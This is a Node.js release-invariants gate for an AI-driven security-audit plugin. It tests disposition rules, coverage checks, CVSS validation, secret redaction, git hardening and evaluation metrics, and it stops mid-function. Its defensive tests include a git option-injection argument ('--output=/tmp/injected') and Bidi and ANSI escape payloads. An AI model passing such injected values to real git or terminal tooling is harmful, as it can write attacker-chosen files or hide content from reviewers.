#!/usr/bin/env node
/**
 * check-release-invariants.mjs
 * Section 24 Release Invariants Gate for AGY Security Audit.
 * Formally validates that 100% of required specifications, contracts,
 * scripts, and test invariants are intact before milestone release.
 */

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFileSync } from 'node:child_process';
import {
  deriveFinalDisposition,
  reconcileCoverage,
  validateReviewManifest,
  validateDirectoryManifest,
  validateCvssV4,
  redactSecrets,
  stripControlAndBidi,
  renderSarifFromCanonical,
  finalizeScan,
  validateDiscoveryCell,
  validateDiscoveryMatrix,
  computeLineageFingerprint,
  validateFindingLineage,
  computeFindingFingerprint,
  calculateEvidenceSufficiency,
  deriveAuthoritativeEvidenceSufficiency,
  validateFindingType,
  VALID_FINDING_TYPES,
  validateSafeProof,
  VALID_PROOF_KINDS,
  validateCanonicalFindings
} from './finalize-scan.mjs';
import { verifyRemediation } from './validate-patch.mjs';
import { buildDirectoryManifest, classifyFile, categorizeDirectory } from './build-inventory.mjs';
import { buildThreatModel, detectRepositoryInventory } from './build-threat-model.mjs';
import { HARDENED_GIT_ENV, getHardenedGitProvenance, resolveGitCommitRef } from './safe-git.mjs';
import { evaluateDiscovery, generateSimulatedCandidates } from './run-discovery-eval.mjs';
import { evaluateStability, computeJaccardSimilarity, generateSimulatedRuns } from './run-stability-eval.mjs';

const REQUIRED_FILES = [
  'LICENSE',
  'README.md',
  'SECURITY.md',
  'plugin.json',
  'rules/AGENTS.md',
  'skills/security-audit/SKILL.md',
  'skills/security-audit/scripts/safe-git.mjs',
  'skills/security-audit/scripts/finalize-scan.mjs',
  'skills/security-audit/scripts/render-sarif.mjs',
  'skills/security-audit/scripts/build-inventory.mjs',
  'skills/security-audit/scripts/build-threat-model.mjs',
  'skills/security-audit/scripts/validate-attack-path.mjs',
  'skills/security-audit/scripts/validate-patch.mjs',
  'skills/security-audit/scripts/run-evals.mjs',
  'skills/security-audit/scripts/run-semantic-eval.mjs',
  'skills/security-audit/scripts/run-discovery-eval.mjs',
  'skills/security-audit/scripts/run-stability-eval.mjs',
  'skills/security-audit/scripts/check-release-invariants.mjs',
  'skills/security-audit/jobs/scan.md',
  'skills/security-audit/jobs/review.md',
  'skills/security-audit/jobs/validate.md',
  'skills/security-audit/jobs/deep.md',
  'skills/security-audit/jobs/remediate.md',
  'skills/security-audit/jobs/verify-fix.md',
  'skills/security-audit/references/discovery.md',
  'skills/security-audit/references/patching-jail.md',
  'skills/security-audit/references/swarm-consensus.md',
  'skills/security-audit/references/threat-modeling.md',
  'skills/security-audit/references/verifier-protocol.md',
  'skills/security-audit/references/finding-lineage.md',
  'skills/security-audit/references/safe-proof-policy.md',
  'agents/threat-modeler.md',
  'agents/discovery-agent.md',
  'agents/verifier-reachability.md',
  'agents/verifier-defenses.md',
  'agents/verifier-impact.md'
];

/**
 * Validates repository release invariants.
 */
export function checkReleaseInvariants(repoRoot = process.cwd()) {
  const errors = [];
  const warnings = [];

  // 1. Check file completeness
  for (const relPath of REQUIRED_FILES) {
    const fullPath = path.resolve(repoRoot, relPath);
    if (!fs.existsSync(fullPath)) {
      errors.push(`Missing required release artifact: ${relPath}`);
    } else {
      const content = fs.readFileSync(fullPath, 'utf8');
      if (content.trim().length === 0) {
        errors.push(`Required release artifact is empty: ${relPath}`);
      }
      const isSelf = relPath.endsWith('check-release-invariants.mjs');
      if (!isSelf && /\bplaceholder\b/i.test(content)) {
        errors.push(`File contains unresolved placeholder: ${relPath}`);
      }
    }
  }

  // 2. Check package.json zero-dependency invariant across all dependency fields
  const pkgPath = path.resolve(repoRoot, 'package.json');
  if (!fs.existsSync(pkgPath)) {
    errors.push('Missing package.json');
  } else {
    try {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const depFields = ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies'];
      for (const field of depFields) {
        if (pkg[field] && Object.keys(pkg[field]).length > 0) {
          errors.push(`Release invariant violation: external ${field} found in package.json: ${Object.keys(pkg[field]).join(', ')}`);
        }
      }
    } catch (e) {
      errors.push(`Failed to parse package.json: ${e.message}`);
    }
  }

  // 3. Check automated test suite
  const testScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/render-sarif.mjs');
  try {
    const stdout = execFileSync(process.execPath, [testScriptPath, '--test'], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('All render-sarif.mjs automated verification tests passed successfully')) {
      errors.push('Test suite did not output successful completion signature');
    }
  } catch (err) {
    errors.push(`Automated test suite failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.1 Check Deterministic Security Invariant & Adversarial Regression Suite (50 Cases) (P2-02, R1-P2-01)
  const evalsScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-evals.mjs');
  try {
    const stdout = execFileSync(process.execPath, [evalsScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('All 50/50 deterministic security invariant and adversarial regression tests passed cleanly!')) {
      errors.push('Deterministic Adversarial Regression Suite did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Deterministic Adversarial Regression Suite failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.2 Check L1.5 Disposition Ground-Truth Benchmark (R1-P2-01 / R2-P0-08)
  const semanticScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-semantic-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [semanticScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('disposition ground-truth invariant tests passed deterministically')) {
      errors.push('L1.5 Disposition Ground-Truth Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`L1.5 Disposition Ground-Truth Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.3 Check Real Agent Discovery Evaluation Benchmark (R2-P0-08)
  const discoveryScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-discovery-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [discoveryScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('Discovery evaluation suite completed successfully')) {
      errors.push('Real Agent Discovery Evaluation Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Real Agent Discovery Evaluation Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.4 Check Multi-Run Stochastic Stability Benchmark (R2-P0-08)
  const stabilityScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-stability-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [stabilityScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('Stability evaluation suite completed successfully')) {
      errors.push('Multi-Run Stochastic Stability Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Multi-Run Stochastic Stability Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 4. Validate Plugin Custom Agents Capability & Tool Invariants (P0-04)
  const agentFiles = [
    'agents/threat-modeler.md',
    'agents/discovery-agent.md',
    'agents/verifier-reachability.md',
    'agents/verifier-defenses.md',
    'agents/verifier-impact.md'
  ];
  for (const af of agentFiles) {
    const p = path.resolve(repoRoot, af);
    if (fs.existsSync(p)) {
      const content = fs.readFileSync(p, 'utf8');
      if (!content.includes('mainAgent: false')) {
        errors.push(`Agent invariant violation: ${af} must declare mainAgent: false`);
      }
      if (!content.includes('subagent: true')) {
        errors.push(`Agent invariant violation: ${af} must declare subagent: true`);
      }
      if (!content.includes('commandExecutionPolicy: off')) {
        errors.push(`Agent invariant violation: ${af} must declare commandExecutionPolicy: off`);
      }
      if (content.includes('read_file')) {
        errors.push(`Agent invariant violation: ${af} contains deprecated/invalid tool name 'read_file'; must use 'view_file'`);
      }
      if (content.includes('run_command') || content.includes('write_to_file') || content.includes('replace_file_content')) {
        errors.push(`Agent invariant violation: ${af} contains prohibited modifying/execution tools`);
      }
      if (/(?:^|\n)\s*permissions\s*:/i.test(content)) {
        errors.push(`Agent invariant violation: ${af} contains unofficial/deprecated 'permissions:' block; must rely on official tools and commandExecutionPolicy (R1-P2-03)`);
      }
      const toolMatch = content.match(/tools:\s*\n((?:\s*-\s*[a-zA-Z0-9_]+\s*\n)+)/);
      if (toolMatch) {
        const declaredTools = toolMatch[1].split('\n')
          .map(l => l.replace(/^\s*-\s*/, '').trim())
          .filter(Boolean);
        const allowedTools = new Set(['view_file', 'list_dir', 'grep_search', 'find_by_name']);
        for (const t of declaredTools) {
          if (!allowedTools.has(t)) {
            errors.push(`Agent invariant violation: ${af} declares non-whitelisted tool '${t}'`);
          }
        }
      }
    }
  }


  // 5. Validate Orchestration & Verification Invariant Consistency (P1-04)
  const skillPath = path.resolve(repoRoot, 'skills/security-audit/SKILL.md');
  if (fs.existsSync(skillPath)) {
    const skillContent = fs.readFileSync(skillPath, 'utf8');
    if (skillContent.includes('--workers')) {
      errors.push('SKILL.md contains legacy --workers parameter; must use --concurrency');
    }
    if (!skillContent.includes('Fixed 3-Lens')) {
      errors.push('SKILL.md must document Fixed 3-Lens verification panel');
    }
  }

  // 6. Authoritative Security Invariants Gate (P2-01)
  const securityInvariants = [
    {
      id: 'SEC-INV-01',
      name: 'no self-certified consensus',
      check: () => {
        const candidate = {
          id: 'INV-1',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 },
          consensus: { verdict: 'CONFIRMED' }
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition === 'REPORTABLE' || res.mappedVerdict === 'CONFIRMED') {
          throw new Error('Self-asserted candidate.consensus was accepted as REPORTABLE/CONFIRMED without verifier ballots');
        }
      }
    },
    {
      id: 'SEC-INV-02',
      name: 'zero votes cannot REPORTABLE',
      check: () => {
        const candidate = {
          id: 'INV-2',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 }
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition !== 'DEFERRED' || res.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
          throw new Error(`Zero-vote candidate did not default-deny to DEFERRED: ${JSON.stringify(res)}`);
        }
      }
    },
    {
      id: 'SEC-INV-03',
      name: 'raw sourceVerified cannot self-certify',
      check: () => {
        const candidate = {
          id: 'INV-3',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 },
          sourceVerified: true,
          dataflowVerified: true,
          isSingleCandidate: true
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition !== 'DEFERRED') {
          throw new Error('Raw candidate evidence flags granted authority without independent verifier ballots');
        }
      }
    },
    {
      id: 'SEC-INV-04',
      name: 'filesystem coverage reconciliation',
      check: () => {
        const fakeManifest = { entries: [{ path: 'agents/', status: 'SCANNED' }] };
        const res = reconcileCoverage(fakeManifest, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Incomplete filesystem manifest falsely achieved COMPLETE coverage');
        }
      }
    },
    {
      id: 'SEC-INV-05',
      name: 'git diff coverage reconciliation',
      check: () => {
        const identicalRevs = {
          mode: 'review',
          base: 'HEAD',
          head: 'HEAD',
          reviewInventory: { changedFiles: [], deletedFiles: [] }
        };
        const res = reconcileCoverage(identicalRevs, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Review manifest with identical base/head revisions falsely achieved COMPLETE coverage');
        }
      }
    },
    {
      id: 'SEC-INV-06',
      name: 'deleted-file accounting',
      check: () => {
        const fakeDeletedManifest = {
          mode: 'review',
          reviewInventory: {
            changedFiles: [],
            deletedFiles: [{ path: 'unaccounted-fake-deleted-file.js', status: 'DELETED' }]
          }
        };
        const res = validateReviewManifest(fakeDeletedManifest, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Fictitious deleted file entry in review inventory was accepted as COMPLETE');
        }
      }
    },
    {
      id: 'SEC-INV-07',
      name: 'canonical-only renderer',
      check: () => {
        const canonicalFinding = {
          id: 'INV-7',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1, endLine: 1 },
          disposition: 'DEFERRED',
          mappedVerdict: 'NEEDS_MANUAL_REVIEW',
          title: 'Unverified Finding'
        };
        const sarif = renderSarifFromCanonical({ canonicalFindings: [canonicalFinding] });
        if (sarif.runs[0].results.length !== 1 || sarif.runs[0].results[0].properties.disposition !== 'DEFERRED') {
          throw new Error('Canonical renderer failed to preserve canonical finding disposition');
        }
        // R1-P1-03: Fabricated REPORTABLE claim without consensus is downgraded to DEFERRED
        const fakeReportable = {
          id: 'INV-7-FAKE',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1, endLine: 1 },
          disposition: 'REPORTABLE',
          verdict: 'CONFIRMED',
          title: 'Fake Confirmed',
          consensus: { supports: 0, totalVotes: 0 },
          rigor: { score: 0.1 }
        };
        const sarifFake = renderSarifFromCanonical({ canonicalFindings: [fakeReportable] });
        if (sarifFake.runs[0].results[0].properties.disposition !== 'DEFERRED') {
          throw new Error('Canonical renderer accepted fabricated REPORTABLE finding without verifier consensus');
        }
      }
    },
    {
      id: 'SEC-INV-08',
      name: 'all verifier REFUTES evidence-bound',
      check: () => {
        const candidate = { id: 'INV-8', location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10 } };
        const unverifiedRefute = [
          { findingId: 'INV-8', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Unverified claim with no evidence' }
        ];
        const res = deriveFinalDisposition(candidate, unverifiedRefute, { score: 0.8 }, repoRoot);
        if (res.disposition === 'SUPPRESSED') {
          throw new Error('Unverified REFUTES ballot without concrete code evidence suppressed finding to FALSE_POSITIVE');
        }
        if (res.disposition !== 'DEFERRED') {
          throw new Error('Unverified REFUTES ballot did not fail closed to DEFERRED');
        }
      }
    },
    {
      id: 'SEC-INV-09',
      name: 'verify-fix requires all 3 lenses',
      check: () => {
        const finding = { id: 'INV-9', ruleId: 'CWE-89', location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10 } };
        // 1 DEFENSES vote only -> REJECTED
        const oneVote = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/security-audit/scripts/safe-git.mjs:10', mitigationReason: 'barrier added' }
        ];
        const res1 = verifyRemediation(finding, oneVote, process.cwd());
        if (res1.verified) {
          throw new Error('Remediation verified with only 1 lens instead of all 3 required lenses');
        }
        // 2 votes only (DEFENSES + REACHABILITY) -> REJECTED
        const twoVotes = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/security-audit/scripts/safe-git.mjs:10', mitigationReason: 'barrier added' },
          { findingId: 'INV-9', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'blocked', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 10, role: 'dead-path' }] }
        ];
        const res2 = verifyRemediation(finding, twoVotes, process.cwd());
        if (res2.verified) {
          throw new Error('Remediation verified with only 2 lenses instead of all 3 required lenses');
        }

        // 3 votes with fake evidence -> REJECTED (R1-P0-02)
        const fakeThreeVotes = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'totally/fake.js:999999', mitigationReason: 'trust me' },
          { findingId: 'INV-9', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'totally/fake.js', line: 10, role: 'dead-path' }] },
          { findingId: 'INV-9', lens: 'IMPACT', decision: 'REFUTES', evidence: [{ path: 'totally/fake.js', line: 10, role: 'impact-boundary' }] }
        ];
        const res3 = verifyRemediation(finding, fakeThreeVotes, process.cwd());
        if (res3.verified) {
          throw new Error('Remediation verified with fake evidence paths instead of verified patched tree');
        }
      }
    },
    {
      id: 'SEC-INV-10',
      name: 'CVSS exact vector rejection',
      check: () => {
        const validVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
        const validRes = validateCvssV4({ vector: validVector });
        if (!validRes.valid || validRes.score !== null) {
          throw new Error('Valid CVSS v4 vector was unexpectedly rejected');
        }

        const badVectorWithSuffix = `${validVector}/EXTRA`;
        const res = validateCvssV4({ vector: badVectorWithSuffix });
        if (res.valid) {
          throw new Error('CVSS v4 vector with illegal suffix was accepted (missing $ anchor)');
        }
        const outOfBounds = validateCvssV4({ score: 11.5, vector: validVector });
        if (outOfBounds.valid) {
          throw new Error('Out of bounds CVSS score (11.5) was accepted or clamped instead of fail-closed rejection');
        }

        // R1-P1-04: Inconsistent CVSS score/vector rejection
        const inconsistentZeroImpact = validateCvssV4({
          vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N',
          score: 10.0,
          severity: 'CRITICAL'
        });
        if (inconsistentZeroImpact.valid) {
          throw new Error('Inconsistent zero-impact CVSS vector with score 10.0 was accepted');
        }
      }
    },
    {
      id: 'SEC-INV-11',
      name: 'no raw-secret leakage',
      check: () => {
        const rawSecret = 'AKIAIOSFODNN7EXAMPLE';
        const text = `const awsKey = "${rawSecret}";`;
        const redacted = redactSecrets(text);
        if (redacted.includes(rawSecret)) {
          throw new Error(`Raw secret leaked into redacted output: ${redacted}`);
        }
        if (!redacted.includes('[REDACTED_AWS_ACCESS_KEY')) {
          throw new Error(`Redacted secret lacks fingerprint prefix: ${redacted}`);
        }
      }
    },
    {
      id: 'SEC-INV-12',
      name: 'Git hostile config cannot execute',
      check: () => {
        if (!HARDENED_GIT_ENV.GIT_CONFIG_GLOBAL || !HARDENED_GIT_ENV.GIT_CONFIG_SYSTEM) {
          throw new Error('HARDENED_GIT_ENV does not isolate global/system git config');
        }
        if (HARDENED_GIT_ENV.GIT_EXTERNAL_DIFF !== '') {
          throw new Error('HARDENED_GIT_ENV does not neutralize GIT_EXTERNAL_DIFF execution hook');
        }
        if (HARDENED_GIT_ENV.GIT_PAGER !== 'cat' || HARDENED_GIT_ENV.PAGER !== 'cat') {
          throw new Error('HARDENED_GIT_ENV does not neutralize GIT_PAGER/PAGER hooks');
        }
        // R1-P1-02: Subcommand option injection defense
        try {
          resolveGitCommitRef(process.cwd(), '--output=/tmp/injected');
          throw new Error('resolveGitCommitRef failed to reject --output option injection');
        } catch (e) {
          if (!e.message.includes('Refusal to parse ref starting with \'-\'')) {
            throw e;
          }
        }
      }
    },
    {
      id: 'SEC-INV-13',
      name: 'Markdown / ANSI / Bidi injection blocked',
      check: () => {
        const bidiPayload = 'Normal Text \u202E Reversed Injection';
        const sanitizedBidi = stripControlAndBidi(bidiPayload);
        if (sanitizedBidi.includes('\u202E')) {
          throw new Error('stripControlAndBidi failed to strip Unicode Bidi override character');
        }
        const ansiPayload = '\u001b[31mRed Alert\u001b[0m';
        const sanitizedAnsi = stripControlAndBidi(ansiPayload);
        if (sanitizedAnsi.includes('\u001b')) {
          throw new Error('stripControlAndBidi failed to strip ANSI escape code');
        }
      }
    },
    {
      id: 'SEC-INV-14',
      name: 'ZIP-clean test harness',
      check: () => {
        // 1. Assert zero release artifacts depend on .git presence
        for (const req of REQUIRED_FILES) {
          if (req.includes('.git')) {
            throw new Error(`Release invariant violation: REQUIRED_FILES includes git path: ${req}`);
          }
        }
        // 2. Assert fallback git provenance operates safely when .git is absent
        const nonGitDir = path.join(os.tmpdir(), 'sec-audit-zip-clean-check');
        const nonGitProvenance = getHardenedGitProvenance(nonGitDir);
        if (nonGitProvenance.branch !== 'unknown' || nonGitProvenance.revisionId !== '0000000000000000000000000000000000000000') {
          throw new Error('getHardenedGitProvenance failed to produce safe fallback in non-git directory');
        }
      }
    },
    {
      id: 'SEC-INV-15',
      name: 'SUPPORTS without evidence cannot REPORTABLE',
      check: () => {
        const candidate = {
          id: 'INV-15',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 25 },
          rigorMetrics: {
            sinkVerified: true,
            sourceVerified: true,
            dataflowTotalSteps: 1,
            dataflowVerifiedSteps: 1,
            mitigationInspected: true
          }
        };
        // 1. 3 SUPPORTS with empty evidence -> DEFERRED
        const noEvVotes = [
          { findingId: 'INV-15', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [] },
          { findingId: 'INV-15', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [] },
          { findingId: 'INV-15', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [] }
        ];
        const resNoEv = deriveFinalDisposition(candidate, noEvVotes, { score: 0.85 }, repoRoot);
        if (resNoEv.disposition !== 'DEFERRED') {
          throw new Error('3 SUPPORTS votes without evidence achieved non-DEFERRED disposition');
        }

        // 2. Fake rigorMetrics on candidate cannot grant REPORTABLE without validated evidence
        const arbitraryEvVotes = [
          { findingId: 'INV-15', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 10, role: 'general' }] },
          { findingId: 'INV-15', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 15, role: 'control' }] },
          { findingId: 'INV-15', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 20, role: 'general' }] }
        ];
        const resFakeRigor = deriveFinalDisposition(candidate, arbitraryEvVotes, { score: 0.95 }, repoRoot);
        if (resFakeRigor.disposition === 'REPORTABLE') {
          throw new Error('Fake candidate rigorMetrics granted REPORTABLE without validated source evidence');
        }
      }
    },
    {
      id: 'SEC-INV-16',
      name: 'Zero-Candidate Discovery Cell & Audit Intent Convergence',
      check: () => {
        const validCell = {
          component: 'Auth',
          family: 'auth/authz/tenancy',
          status: 'REVIEWED_NO_CANDIDATE',
          reviewedEvidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 1 }],
          notes: 'No unmitigated vulnerabilities found.'
        };
        const cellRes = validateDiscoveryCell(validCell, repoRoot);
        if (!cellRes.valid) {
          throw new Error(`Valid REVIEWED_NO_CANDIDATE cell failed validation: ${cellRes.error}`);
        }

        const badCell = {
          component: 'Auth',
          family: 'auth/authz/tenancy',
          status: 'REVIEWED_NO_CANDIDATE',
          reviewedEvidence: []
        };
        if (validateDiscoveryCell(badCell, repoRoot).valid) {
          throw new Error('REVIEWED_NO_CANDIDATE accepted without inspection evidence');
        }

        const cleanManifest = buildDirectoryManifest(repoRoot);
        const cleanRun = finalizeScan({
          candidates: [],
          manifest: cleanManifest,
          repoRoot,
          auditIntent: 'REGRESSION',
          discoveryMatrix: [validCell]
        });
        if (!cleanRun.summary.canDeclareClean || cleanRun.summary.auditIntent !== 'REGRESSION') {
          throw new Error('Zero candidate run with complete coverage failed to achieve bounded clean assurance');
        }

        // Validate matrix fail-closed behavior
        const invalidMatrix = [validCell, { component: 'Bad', family: 'fam', status: 'INVALID_STATUS' }];
        const matRes = validateDiscoveryMatrix(invalidMatrix, repoRoot);
        if (matRes.valid) {
          throw new Error('validateDiscoveryMatrix accepted invalid cell status');
        }
        const malformedRun = finalizeScan({
          candidates: [],
          manifest: cleanManifest,
          repoRoot,
          discoveryMatrix: invalidMatrix
        });
        if (malformedRun.summary.canDeclareClean) {
          throw new Error('finalizeScan allowed canDeclareClean: true with invalid discovery matrix');
        }
      }
    },
    {
      id: 'SEC-INV-17',
      name: 'Finding Lineage & Fingerprint v2 Line-Shift Invariance',
      check: () => {
        // 1. Line-shift invariance of lineageId
        const idLine10 = computeLineageFingerprint({
          ruleId: 'CWE-89',
          uri: 'src/db.ts',
          component: 'Database',
          family: 'injection/query/template/eval',
          symbol: 'executeRawQuery'
        });
        const idLine250 = computeLineageFingerprint({
          ruleId: 'CWE-89',
          uri: 'src/db.ts',
          component: 'Database',
          family: 'injection/query/template/eval',
          symbol: 'executeRawQuery'
        });
        if (idLine10 !== idLine250) {
          throw new Error('computeLineageFingerprint is not deterministic across invocations');
        }

        // 2. Exact location fingerprint differs across lines
        const locFp1 = computeFindingFingerprint('CWE-89', 'src/db.ts', 10);
        const locFp2 = computeFindingFingerprint('CWE-89', 'src/db.ts', 250);
        if (locFp1 === locFp2) {
          throw new Error('computeFindingFingerprint failed to differentiate different line numbers');
        }

        // 3. validateFindingLineage rejects invalid novelty
        const badNov = validateFindingLineage({ novelty: 'SUPER_NOVEL' });
        if (badNov.valid) {
          throw new Error('validateFindingLineage accepted invalid novelty state');
        }

        // 4. validateFindingLineage requires whyNow on FIX_INTRODUCED and PREVIOUSLY_MISSED
        const fixNoWhy = validateFindingLineage({ novelty: 'FIX_INTRODUCED', whyNow: '' });
        if (fixNoWhy.valid) {
          throw new Error('validateFindingLineage accepted FIX_INTRODUCED with empty whyNow');
        }
        const fixWithWhy = validateFindingLineage({ novelty: 'FIX_INTRODUCED', whyNow: 'Fix introduced new parameter' });
        if (!fixWithWhy.valid) {
          throw new Error('validateFindingLineage rejected valid FIX_INTRODUCED with whyNow');
        }
      }
    },
    {
      id: 'SEC-INV-18',
      name: 'CVSS v4.0 Base Metric Vector (no heuristic guesswork) & Evidence Sufficiency',
      check: () => {
        // 1. CVSS v4 with score: null yields severity: 'UNRATED' (no heuristic deduction)
        const unratedVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
        const unratedRes = validateCvssV4({ vector: unratedVector, score: null });
        if (!unratedRes.valid || unratedRes.severity !== 'UNRATED') {
          throw new Error(`validateCvssV4 guessed or altered severity for unscored vector: got ${unratedRes.severity}`);
        }

        // 2. Zero-impact vector yields NONE
        const zeroVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N';
        const zeroRes = validateCvssV4({ vector: zeroVector, score: null });
        if (!zeroRes.valid || zeroRes.severity !== 'NONE') {
          throw new Error(`validateCvssV4 failed to map zero-impact vector to NONE: got ${zeroRes.severity}`);
        }

        // 3. finalizeScan does NOT fallback invalid CVSS to MEDIUM; yields UNRATED
        const badCvssRun = finalizeScan({
          candidates: [{
            id: 'SEC-BAD-CVSS',
            ruleId: 'CWE-89',
            title: 'Bad CVSS candidate',
            location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
            cvssV4: { vector: 'CVSS:4.0/AV:N/INVALID', score: 5.0 }
          }],
          repoRoot
        });
        if (badCvssRun.canonicalFindings[0].severity !== 'UNRATED') {
          throw new Error(`finalizeScan fell back invalid CVSS to ${badCvssRun.canonicalFindings[0].severity} instead of UNRATED`);
        }

        // 4. calculateEvidenceSufficiency returns structured completeness heuristic
        const suff = calculateEvidenceSufficiency({
          sourceVerified: true,
          sinkVerified: true,
          dataflowVerifiedSteps: 2,
          dataflowTotalSteps: 2,
          pocSyntacticDemonstrated: true,
          mitigationInspected: true
        });
        if (suff.score !== 1.0 || suff.sufficiencyLevel !== 'HIGH' || !suff.disclaimer) {
          throw new Error('calculateEvidenceSufficiency failed to produce valid sufficiency object with disclaimer');
        }
      }
    },
    {
      id: 'SEC-INV-19',
      name: 'Benchmark Truthfulness, Discovery Evaluation & Multi-Run Stability',
      check: () => {
        // 1. Jaccard similarity mathematical correctness
        const set1 = ['A', 'B', 'C'];
        const set2 = ['B', 'C', 'D'];
        const sim = computeJaccardSimilarity(set1, set2); // 2 / 4 = 0.5
        if (sim !== 0.5) {
          throw new Error(`computeJaccardSimilarity failed: expected 0.5, got ${sim}`);
        }
        if (computeJaccardSimilarity(['X'], ['Y']) !== 0.0) {
          throw new Error('computeJaccardSimilarity failed for disjoint sets');
        }
        if (computeJaccardSimilarity(['X'], ['X']) !== 1.0) {
          throw new Error('computeJaccardSimilarity failed for identical sets');
        }

        // 2. evaluateDiscovery calculations
        const mockTruth = [
          { id: 'GT-01', cwe: 'CWE-89', file: 'src/db.js', targetLine: 10, expectedVerdict: 'VULNERABLE' },
          { id: 'GT-02', cwe: 'CWE-79', file: 'src/view.js', targetLine: 20, expectedVerdict: 'SAFE' }
        ];
        const mockCandidates = [
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } },
          { ruleId: 'CWE-79', location: { uri: 'src/view.js', startLine: 20 } } // Spurious FP on safe site
        ];
        const discRes = evaluateDiscovery(mockCandidates, mockTruth);
        if (discRes.candidateTP !== 1 || discRes.candidateFP !== 1 || discRes.candidateFN !== 0) {
          throw new Error(`evaluateDiscovery metrics incorrect: TP=${discRes.candidateTP}, FP=${discRes.candidateFP}, FN=${discRes.candidateFN}`);
        }
        if (discRes.precision !== 0.5 || discRes.recall !== 1.0) {
          throw new Error(`evaluateDiscovery precision/recall incorrect: P=${discRes.precision}, R=${discRes.recall}`);
        }

        // 2b. evaluateDiscovery rejects empty URI and prevents duplicate TP inflation (Findings 1 & 2)
        const advCandidates = [
          {},
          { ruleId: 'CWE-89', location: { uri: '' } },
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } },
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } }
        ];
        const advRes = evaluateDiscovery(advCandidates, mockTruth);
        if (advRes.candidateTP !== 1 || advRes.duplicateCandidateCount !== 1) {
          throw new Error('evaluateDiscovery failed to reject empty URI or duplicate TP inflation');
        }

        // 3. evaluateStability calculations across simulated runs
        const simRuns = [
          [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 }, symbol: 'q' }],
          [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 15 }, symbol: 'q' }] // shifted line
        ];
        const stabRes = evaluateStability(simRuns, repoRoot);
